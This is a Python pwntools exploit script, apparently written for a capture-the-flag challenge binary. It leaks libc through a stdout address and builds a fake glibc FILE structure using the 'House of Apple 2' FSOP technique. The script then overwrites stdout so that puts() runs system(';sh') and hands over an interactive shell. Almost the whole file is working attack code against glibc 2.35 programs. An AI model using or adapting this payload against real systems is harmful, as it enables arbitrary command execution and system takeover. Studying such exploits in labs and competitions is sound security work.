from pwn import *

context.arch = "amd64"
context.log_level = "info"

exe = "./prob"
libc_path = "./libc.so.6"

elf = context.binary = ELF(exe, checksec=False)
libc = ELF(libc_path, checksec=False)

p = remote('0.0.0.0', 31337)
# p = process(exe)


def build_fsop_struct(
    flags=0,
    _IO_read_ptr=0,
    _IO_read_end=0,
    _IO_read_base=0,
    _IO_write_base=0,
    _IO_write_ptr=0,
    _IO_write_end=0,
    _IO_buf_base=0,
    _IO_buf_end=0,
    _IO_save_base=0,
    _IO_backup_base=0,
    _IO_save_end=0,
    _markers=0,
    _chain=0,
    _fileno=0,
    _flags2=0,
    _old_offset=0,
    _cur_column=0,
    _vtable_offset=0,
    _shortbuf=0,
    lock=0,
    _offset=0,
    _codecvt=0,
    _wide_data=0,
    _freeres_list=0,
    _freeres_buf=0,
    __pad5=0,
    _mode=0,
    _unused2=b"",
    vtable=0,
    more_append=b"",
):
    fs  = p64(flags)
    fs += p64(_IO_read_ptr)
    fs += p64(_IO_read_end)
    fs += p64(_IO_read_base)
    fs += p64(_IO_write_base)
    fs += p64(_IO_write_ptr)
    fs += p64(_IO_write_end)
    fs += p64(_IO_buf_base)
    fs += p64(_IO_buf_end)
    fs += p64(_IO_save_base)
    fs += p64(_IO_backup_base)
    fs += p64(_IO_save_end)
    fs += p64(_markers)
    fs += p64(_chain)
    fs += p32(_fileno)
    fs += p32(_flags2)
    fs += p64(_old_offset)
    fs += p16(_cur_column)
    fs += p8(_vtable_offset)
    fs += p8(_shortbuf)
    fs += p32(0)
    fs += p64(lock)
    fs += p64(_offset)
    fs += p64(_codecvt)
    fs += p64(_wide_data)
    fs += p64(_freeres_list)
    fs += p64(_freeres_buf)
    fs += p64(__pad5)
    fs += p32(_mode)

    if _unused2 == b"":
        fs += b"\x00" * 0x14
    else:
        fs += _unused2[:0x14].ljust(0x14, b"\x00")

    fs += p64(vtable)
    fs += more_append
    return fs


# ============================================================
# 1. Leak libc
# ============================================================

# Case A: program directly prints stdout address.
leak_line = p.recvline().strip()
stdout_leak = int(leak_line, 16)

libc.address = stdout_leak - libc.sym["_IO_2_1_stdout_"]

log.success(f"stdout leak = {hex(stdout_leak)}")
log.success(f"libc base   = {hex(libc.address)}")


# ============================================================
# 2. Important libc addresses
# ============================================================

stdout = libc.sym["_IO_2_1_stdout_"]
system = libc.sym["system"]
wfile_jumps = libc.sym["_IO_wfile_jumps"]

log.success(f"_IO_2_1_stdout_ = {hex(stdout)}")
log.success(f"system          = {hex(system)}")
log.success(f"_IO_wfile_jumps = {hex(wfile_jumps)}")


# ============================================================
# 3. Build House of Apple 2 payload for stdout
# ============================================================

# On glibc 2.35, stdout lock is near __nptl_last_event.
# This value is commonly used for the stdout FSOP variant.
stdout_lock = libc.sym["__nptl_last_event"] - 0x48

payload = build_fsop_struct(
    # Beginning of stdout becomes a command string.
    # This is interpreted as ";sh".
    flags=u64(b"\x01\x01\x01\x01;sh\x00"),

    # Valid writable lock location.
    lock=stdout_lock,

    # Pivot stdout->_wide_data near stdout itself.
    _wide_data=stdout - 0x10,

    # This field is later used as the controlled function pointer.
    _markers=system,

    # Fake wide-vtable pointer chain.
    _unused2=p32(0) + p64(0) + p64(stdout - 0x8),

    # Valid libc vtable, shifted so puts() reaches the wide overflow path.
    vtable=wfile_jumps - 0x20,

    # Avoid annoying wide cleanup path.
    _mode=0xFFFFFFFF,
)

log.info(f"payload length = {len(payload)}")


# ============================================================
# 4. Send overwrite into stdout
# ============================================================

# The challenge read() writes this into stdout.
# Some versions expect raw send, some are fine with sendline.
p.sendline(payload)


# ============================================================
# 5. puts() triggers FSOP and system('sh')
# ============================================================

p.interactive()